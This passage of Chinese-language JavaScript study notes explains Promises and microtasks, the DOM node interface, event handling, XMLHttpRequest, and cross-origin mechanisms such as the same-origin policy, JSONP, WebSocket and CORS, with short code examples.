实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。 Promise 对象的状态Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。异步操作未完成（pending）、异步操作成功（fulfilled）、异步操作失败（rejected）。fulfilled和rejected合在一起称为resolved（已定型）。这三种的状态的变化途径只有两种。从“未完成”到“成功” 和 从“未完成”到“失败”。一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。 Promise 构造函数JavaScript 提供原生的Promise构造函数，用来生成 Promise 实例。 123456789var promise = new Promise(function (resolve, reject) &#123; // ... if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; /* 异步操作失败 */ reject(new Error()); &#125;&#125;); 微任务Promise 的回调函数属于异步任务，会在同步任务之后执行。 但是，Promise 的回调函数不是正常的异步任务，而是微任务（microtask）。它们的区别在于，正常任务追加到下一轮事件循环，微任务追加到本轮事件循环。这意味着，微任务的执行时间一定早于正常任务。1234567891011121314151617181920// 下面代码会先输出2，再输出1。因为console.log(2)是同步任务，而then的回调函数属于异步任务，一定晚于同步任务执行。new Promise(function (resolve, reject) &#123; resolve(1);&#125;).then(console.log);console.log(2);// 2 1// 下面代码的输出结果是321。这说明then的回调函数的执行时间，早于setTimeout(fn, 0)。因为then是本轮事件循环执行，setTimeout(fn, 0)在下一轮事件循环开始时执行。setTimeout(function() &#123; console.log(1);&#125;, 0);new Promise(function (resolve, reject) &#123; resolve(2);&#125;).then(console.log);console.log(3);// 3 2 1 DOMDOM 概述 DOMDOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。 浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。 节点DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。 节点的类型有七种:Document：整个文档树的顶层节点DocumentType：doctype标签（比如 !DOCTYPE html）Element：网页的各种HTML标签（比如 body&gt;、a等）Attribute：网页元素的属性（比如class=”right”）Text：标签之间或标签包含的文本Comment：注释DocumentFragment：文档的片段 浏览器提供一个原生的节点对象Node，上面这七种节点都继承了Node，因此具有一些共同的属性和方法。 节点树一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，倒过来就像一棵树。 浏览器原生提供document节点，代表整个文档。文档的第一层只有一个节点，就是 HTML 网页的第一个标签 html，它构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。除了根节点，其他节点都有三种层级关系。父节点关系（parentNode）、子节点关系（childNodes）、同级节点关系（sibling）。 Node 接口所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。 nodeType 返回一个整数值，表示节点的类型不同节点的nodeType属性值和对应的常量如下。文档节点（document）：9，对应常量Node.DOCUMENT_NODE元素节点（element）：1，对应常量Node.ELEMENT_NODE属性节点（attr）：2，对应常量Node.ATTRIBUTE_NODE文本节点（text）：3，对应常量Node.TEXT_NODE文档片断节点（DocumentFragment）：11，对应常量Node.DOCUMENT_FRAGMENT_NODE文档类型节点（DocumentType）：10，对应常量Node.DOCUMENT_TYPE_NODE注释节点（Comment）：8，对应常量Node.COMMENT_NODE nodeName 返回节点的名称不同节点的nodeName属性值如下。文档节点（document）：#document元素节点（element）：大写的标签名属性节点（attr）：属性的名称文本节点（text）：#text文档片断节点（DocumentFragment）：#document-fragment文档类型节点（DocumentType）：文档的类型注释节点（Comment）：#comment nodeValue 返回一个字符串，表示当前节点本身的文本值，可读写只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值，因此这三类节点的nodeValue可以返回结果，其他类型的节点一律返回null。同样的，也只有这三类节点可以设置nodeValue属性的值，其他类型的节点设置无效。 baseURI 属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。该属性的值一般由当前网址的 URL（即window.location属性）决定，但是可以使用 HTML 的 base标签，改变该属性的值。 nextSibling 返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回null previousSibling 返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回null parentNode 返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment） childNodes 返回一个类似数组的对象（NodeList集合），成员包括当前节点的所有子节点 firstChild 返回当前节点的第一个子节点，如果当前节点没有子节点，则返回null。 lastChild appendChild() 方法接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。 hasChildNodes()注意，子节点包括所有类型的节点，并不仅仅是元素节点。哪怕节点只包含一个空格，hasChildNodes方法也会返回true。 insertBefore() 将某个节点插入父节点内部的指定位置。 removeChild() 接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。 replaceChild() 将一个新的节点，替换当前节点的某一个子节点。 事件EventTarget 接口DOM 的事件操作（监听和触发），都定义在EventTarget接口。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如，XMLHttpRequest、AudioNode、AudioContext）也部署了这个接口。 target.addEventListener(type, listener[, useCapture]);type：事件名称，大小写敏感。listener：监听函数。事件发生时，会调用该监听函数。useCapture：布尔值，表示监听函数是否在捕获阶段（capture）触发，默认为false（监听函数只在冒泡阶段被触发）。该参数可选。 第三个参数除了布尔值useCapture，还可以是一个属性配置对象。该对象有以下属性。capture：布尔值，表示该事件是否在捕获阶段触发监听函数。once：布尔值，表示监听函数是否只触发一次，然后就自动移除。passive：布尔值，表示监听函数不会调用事件的preventDefault方法。如果监听函数调用了，浏览器将忽略这个要求，并在监控台输出一行警告。1234var para = document.getElementById('para');para.addEventListener('click', function (e) &#123; console.log(this.nodeName) // 监听函数内部的this，指向当前事件所在的那个对象 para。&#125;, &#123;once: true&#125;); target.removeEventListener(type, listener[, useCapture]); 移除addEventListener方法添加的事件监听函数removeEventListener方法的参数，与addEventListener方法完全一致。它的第一个参数“事件类型”，大小写敏感。 注意，removeEventListener方法移除的监听函数，必须是addEventListener方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。12div.addEventListener('click', listener, false);div.removeEventListener('click', listener, false); target.dispatchEvent(event) 在当前节点上触发指定事件，从而触发监听函数的执行该方法返回一个布尔值，只要有一个监听函数调用了Event.preventDefault()，则返回值为false，否则为true。dispatchEvent方法的参数是一个Event对象的实例。1234para.addEventListener('click', hello, false);var event = new Event('click');para.dispatchEvent(event);// 上面代码在当前节点触发了click事件。 事件模型监听函数 HTML 的 on- 属性HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。 12345678// 元素的事件监听属性，都是on加上事件名，比如onload就是on + load，表示load事件的监听代码。&lt;p onload="doSomething()"&gt;&lt;/p&gt;// 注意，这些属性的值是将会执行的代码，而不是一个函数。一旦指定的事件发生，on-属性的值是原样传入 JavaScript 引擎执行。// 因此如果要执行函数，不要忘记加上一对圆括号。// 使用这个方法指定的监听代码，只会在冒泡阶段触发。// 缺点: 同一个事件只能定义一个监听函数，也就是说，如果定义两次onclick属性，后一次定义会覆盖前一次。因此，也不推荐使用。 元素节点的事件属性元素节点对象的事件属性，同样可以指定监听函数。使用这个方法指定的监听函数，也是只会在冒泡阶段触发。 12345678window.onload = doSomething;div.onclick = function (event) &#123; console.log('触发事件');&#125;;// 注意，这种方法与 HTML 的on-属性的差异是，它的值是函数名（doSomething），而不像后者，必须给出完整的监听代码（doSomething()）。// 缺点: 违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此不推荐使用。 EventTarget.addEventListener()所有 DOM 节点实例都有addEventListener方法，用来为该节点定义事件的监听函数。 优点: 同一个事件可以添加多个监听函数。能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。除了 DOM 节点，其他对象（比如window、XMLHttpRequest等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。 以上三种this 的指向，监听函数内部的this指向触发事件的那个元素节点。 Event 对象事件发生以后，会产生一个事件对象，作为参数传给监听函数。浏览器原生提供一个Event对象，所有的事件都是这个对象的实例，或者说继承了Event.prototype对象。 Event对象本身就是一个构造函数，可以用来生成新的实例。 12345678910111213event = new Event(type, options);// Event构造函数接受两个参数。第一个参数type是字符串，表示事件的名称；第二个参数options是一个对象，表示事件对象的配置。该对象主要有下面两个属性。// bubbles：布尔值，可选，默认为false，表示事件对象是否冒泡。若不显示地设置为true，生成的事件就只能在“捕获阶段”触发监听函数。// cancelable：布尔值，可选，默认为false，表示事件是否可以被取消，即能否用Event.preventDefault()取消这个事件。var ev = new Event( 'look', &#123; 'bubbles': true, 'cancelable': false &#125;);document.dispatchEvent(ev); 鼠标事件鼠标事件指与鼠标相关的事件，继承了MouseEvent接口。具体的事件主要有以下一些。click：按下鼠标（通常是按下主按钮）时触发。dblclick：在同一个元素上双击鼠标时触发。mousedown：按下鼠标键时触发。mouseup：释放按下的鼠标键时触发。mousemove：当鼠标在一个节点内部移动时触发。当鼠标持续移动时，该事件会连续触发。mouseenter：鼠标进入一个节点时触发，进入子节点不会触发这个事件。mouseover：鼠标进入一个节点时触发，进入子节点会再一次触发这个事件。mouseout：鼠标离开一个节点时触发，离开父节点也会触发这个事件。mouseleave：鼠标离开一个节点时触发，离开父节点不会触发这个事件。contextmenu：按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文菜单键”时触发。wheel：滚动鼠标的滚轮时触发，该事件继承的是WheelEvent接口。 click事件指的是，用户在同一个位置先完成mousedown动作，再完成mouseup动作。因此，触发顺序是，mousedown首先触发，mouseup接着触发，click最后触发。dblclick事件则会在mousedown、mouseup、click之后触发。mouseover事件和mouseenter事件，都是鼠标进入一个节点时触发。区别是，mouseenter事件只触发一次，而只要鼠标在节点内部移动，mouseover事件会在子节点上触发多次。mouseout事件和mouseleave事件，都是鼠标离开一个节点时触发。区别是，在父元素内部离开一个子元素时，mouseleave事件不会触发，而mouseout事件会触发。 BOM浏览器环境概述 script 元素的defer 属性为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对 script元素加入defer属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。 有了defer属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在DOMContentLoaded事件触发前执行（即刚刚读取完 html标签），而且可以保证执行顺序就是它们在页面上出现的顺序。 script 元素的async 属性async属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。 async属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用async属性的脚本文件里面的代码，不应该使用document.write方法。 一般来说，如果脚本之间没有依赖关系，就使用async属性，如果脚本之间有依赖关系，就使用defer属性。如果同时使用async和defer属性，后者不起作用，浏览器行为由async属性决定。 渲染引擎渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。不同的浏览器有不同的渲染引擎。Firefox：Gecko 引擎Safari：WebKit 引擎Chrome：Blink 引擎IE: Trident 引擎Edge: EdgeHTML 引擎 重流和重绘渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。 页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（a:hover）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。 重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。 XMLHttpRequest 对象AJAX（Asynchronous JavaScript and XML)。AJAX 通过原生的XMLHttpRequest对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。1234567891011121314151617181920var xhr = new XMLHttpRequest();xhr.open('GET', '/endpoint', true);xhr.onreadystatechange = function()&#123; // 通信成功时，通信状态值为4 if (xhr.readyState === 4)&#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || (xhr.status === 304))&#123; console.log(xhr.responseText); &#125; else &#123; console.error(xhr.statusText); &#125; &#125;&#125;;xhr.onerror = function (e) &#123; console.error(xhr.statusText);&#125;;xhr.send(null); XMLHttpRequest.readyState 返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。0，表示 XMLHttpRequest 实例已经生成，但是实例的open()方法还没有被调用。1，表示open()方法已经调用，但是实例的send()方法还没有调用，仍然可以使用实例的setRequestHeader()方法，设定 HTTP 请求的头信息。2，表示实例的send()方法已经调用，并且服务器返回的头信息和状态码已经收到。3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的responseType属性等于text或者空字符串，responseText属性就会包含已经收到的部分信息。4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。 XMLHttpRequest.withCredentials属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为false，即向example.com发出跨域请求时，不会发送example.com设置在本机上的 Cookie（如果有的话）。 如果需要跨域 AJAX 请求发送 Cookie，需要withCredentials属性设为true。注意，同源的请求不需要设置这个属性。 为了让这个属性生效，服务器必须显式返回Access-Control-Allow-Credentials: true 这个头信息。 withCredentials属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果withCredentials属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。 注意，脚本总是遵守同源政策，无法从document.cookie或者 HTTP 回应的头信息之中，读取跨域的 Cookie，withCredentials属性不影响这一点。 XMLHttpRequest.uploadXMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过XMLHttpRequest.upload属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。 1234567891011121314151617181920&lt;progress min="0" max="100" value="0"&gt;0% complete&lt;/progress&gt;function upload(blobOrFile) &#123; var xhr = new XMLHttpRequest(); xhr.open('POST', '/server', true); xhr.onload = function (e) &#123;&#125;; var progressBar = document.querySelector('progress'); xhr.upload.onprogress = function (e) &#123; if (e.lengthComputable) &#123; progressBar.value = (e.loaded / e.total) * 100; // 兼容不支持 &lt;progress&gt; 元素的老式浏览器 progressBar.textContent = progressBar.value; &#125; &#125;; xhr.send(blobOrFile);&#125;upload(new Blob(['hello world'], &#123;type: 'text/plain'&#125;)); XMLHttpRequest.open() 方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。method：表示 HTTP 动词方法，比如GET、POST、PUT、DELETE、HEAD等。url: 表示请求发送目标 URL。async: 布尔值，表示请求是否为异步，默认为true。如果设为false，则send()方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为false。user：表示用于认证的用户名，默认为空字符串。该参数可选。password：表示用于认证的密码，默认为空字符串。该参数可选 注意，如果对使用过open()方法的 AJAX 请求，再次使用这个方法，等同于调用abort()，即终止请求。 XMLHttpRequest.send() 方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。send方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。12345678910111213141516171819202122232425262728293031323334353637// 下面是 GET 请求的例子。var xhr = new XMLHttpRequest();xhr.open('GET', 'http://www.example.com/?id=' + encodeURIComponent(id), true);xhr.send(null);// 下面是发送 POST 请求的例子。var xhr = new XMLHttpRequest();var data = 'email=' + encodeURIComponent(email) + '&amp;password=' + encodeURIComponent(password);xhr.open('POST', 'http://www.example.com', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send(data);// 下面是发送表单数据的例子。FormData对象可以用于构造表单数据。var formData = new FormData();formData.append('username', '张三');formData.append('email', 'zhangsan@example.com');formData.append('birthDate', 2019);var xhr = new XMLHttpRequest();xhr.open('POST', '/register');xhr.send(formData);// 上面代码中，FormData对象构造了表单数据，然后使用send()方法发送。它的效果与发送下面的表单数据是一样的。&lt;form id='registration' name='registration' action='/register'&gt; &lt;input type='text' name='username' value='张三'&gt; &lt;input type='email' name='email' value='zhangsan@example.com'&gt; &lt;input type='number' name='birthDate' value='1940'&gt; &lt;input type='submit' onclick='return sendForm(this.form);'&gt;&lt;/form&gt; 注意，所有 XMLHttpRequest 的监听事件，都必须在send()方法调用之前设定。 XMLHttpRequest.setRequestHeader() 方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在open()之后、send()之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。 该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。123xhr.setRequestHeader('Content-Type', 'application/json');xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);xhr.send(JSON.stringify(data)); XMLHttpRequest.overrideMimeType() 方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是text/xml，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成text/plain，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。 修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用responseType属性告诉服务器。只有在服务器无法返回某种数据类型时，才使用overrideMimeType()方法。 XMLHttpRequest.getResponseHeader() 方法返回 HTTP 头信息指定字段的值如果还没有收到服务器回应或者指定字段不存在，返回null。该方法的参数不区分大小写。如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。 XMLHttpRequest.getAllResponseHeaders() 方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用CRLF分隔（回车+换行），如果没有收到服务器回应，该属性为null。如果发生网络错误，该属性为空字符串。 123456789101112var xhr = new XMLHttpRequest();xhr.open('GET', 'foo.txt', true);xhr.send();xhr.onreadystatechange = function () &#123; if (this.readyState === 4) &#123; var lastModified = xhr.getResponseHeader("Last-Modified"); var headers = xhr.getAllResponseHeaders(); console.log(headers) &#125;&#125; XMLHttpRequest.abort() 方法用来终止已经发出的 HTTP 请求。调用这个方法以后，readyState属性变为4，status属性变为0 同源限制概述 含义浏览器安全的基石是“同源政策”（same-origin policy）。 1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。协议相同、域名相同、端口相同。 举例来说，http://www.example.com/dir/page.html这个网址，协议是http://，域名是www.example.com，端口是80（默认端口可以省略）。 目的同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。 限制范围随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。（2） 无法接触非同源网页的 DOM。（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。 CookieCookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置document.domain共享 Cookie。 举例来说，A 网页的网址是http://w1.example.com/a.html，B 网页的网址是http://w2.example.com/b.html，那么只要设置相同的document.domain，两个网页就可以共享 Cookie。因为浏览器通过document.domain属性来检查是否同源。 注意，A 和 B 两个网页都需要设置document.domain属性，才能达到同源的目的。因为设置document.domain的同时，会把端口重置为null，因此如果只设置一个网页的document.domain，会导致两个网址的端口不同，还是达不到同源的目的。 注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用 PostMessage API。 另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如.example.com。 Set-Cookie: key=value; domain=.example.com; path=/ 。这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。 iframe 和多窗口通信iframe元素可以在当前网页之中，嵌入其他网页。每个iframe元素形成自己的窗口，即有自己的window对象。iframe窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。 这种情况不仅适用于iframe窗口，还适用于window.open方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，拿到 DOM。 对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。片段识别符（fragment identifier）和 跨文档通信API（Cross-document messaging）。 片段识别符片段标识符（fragment identifier）指的是，URL 的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。 window.postMessage()跨文档通信 API（Cross-document messaging）为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口aaa.com向子窗口bbb.com发消息，调用postMessage方法就可以了。 postMessage方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为*，表示不限制域名，向所有窗口发送。 123456789101112131415161718192021222324252627// 父窗口打开一个子窗口var popup = window.open('http://bbb.com', 'title');// 父窗口向子窗口发消息popup.postMessage('Hello World!', 'http://bbb.com');// 子窗口向父窗口发消息window.opener.postMessage('Nice to see you', 'http://aaa.com');// 父窗口和子窗口都可以通过message事件，监听对方的消息。window.addEventListener('message', function (event) &#123; console.log(event.data);&#125;,false);// event.source：发送消息的窗口// event.origin: 消息发向的网址// event.data: 消息内容// event.origin属性可以过滤不是发给本窗口的消息。window.addEventListener('message', receiveMessage);function receiveMessage(event) &#123; if (event.origin !== 'http://aaa.com') return; if (event.data === 'Hello World') &#123; event.source.postMessage('Hello', event.origin); &#125; else &#123; console.log(event.data); &#125;&#125; 通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。 AJAX同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。 JSONPJSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务端改造非常小。 它的基本思想是，网页通过添加一个 script元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。1234567891011121314151617181920// 首先，网页动态插入&lt;script&gt;元素，由它向跨源网址发出请求。function addScriptTag(src) &#123; var script = document.createElement('script'); script.setAttribute("type","text/javascript"); script.src = src; document.body.appendChild(script);&#125;window.onload = function () &#123; addScriptTag('http://example.com/ip?callback=foo');&#125;function foo(data) &#123; console.log('Your public IP address is: ' + data.ip);&#125;;// 上面代码通过动态添加&lt;script&gt;元素，向服务器example.com发出请求。该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于 JSONP 是必需的。服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。foo(&#123; "ip": "8.8.8.8"&#125;);// 由于&lt;script&gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用JSON.parse的步骤。 WebSocketWebSocket 是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 浏览器发出的 WebSocket 请求的头信息有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。正是因为有了Origin这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出相应回应。 CORSCORS 跨源资源分享，是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发GET请求，CORS 允许任何类型的请求。 CORS 通信简介CORS（Cross-origin resource sharing）跨域资源共享，是一个 W3C 标准。它允许浏览器向跨域的服务器，发出XMLHttpRequest请求，从而克服了 AJAX 只能同源使用的限制。 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。 两种请求CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。（1）请求方法是以下三种方法之一 HEAD、GET、POST（2）HTTP 的头信息不超出以下几种字段。Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type(只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain) 凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。 这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。 简单请求对于简单请求，浏览器直接发出 CORS 请求，自动在头信息之中，添加一个Origin字段。Origin字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定Access-Control-Allow-Credentials字段，告诉浏览器可以发送 Cookie。同时，必须在 AJAX 请求中打开withCredentials属性。否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。 需要注意的是，如果服务器要求浏览器发送 Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的document.cookie也无法读取服务器域名下的 Cookie。 非简单请求非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。 非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量DELETE和PUT请求，这些传统的表单不可能跨域发出的请求。 “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。除了Origin字段，“预检”请求的头信息包括两个特殊字段。Access-Control-Request-Method 和 Access-Control-Request-Headers。 服务器收到“预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。在服务器的回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 服务器回应的其他 CORS 相关字段如下。1234Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 //单位为秒 即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求 一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段，每次回应都必定包含的。 Location 对象 和 URL 对象Location 对象Location对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过window.location和document.location属性，可以拿到这个对象。123456789101112// 当前网址为 http://user:passwd@www.example.com:4097/path/a.html?x=111#part1document.location.href 整个 URL // "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"document.location.protocol 当前 URL 的协议，包括冒号（:） // "http:"document.location.host 主机，包括冒号（:）和端口（默认的80端口和443端口会省略） // "www.example.com:4097"document.location.hostname 主机名，不包括端口 // "www.example.com"document.location.port 端口号 // "4097"document.location.pathname URL 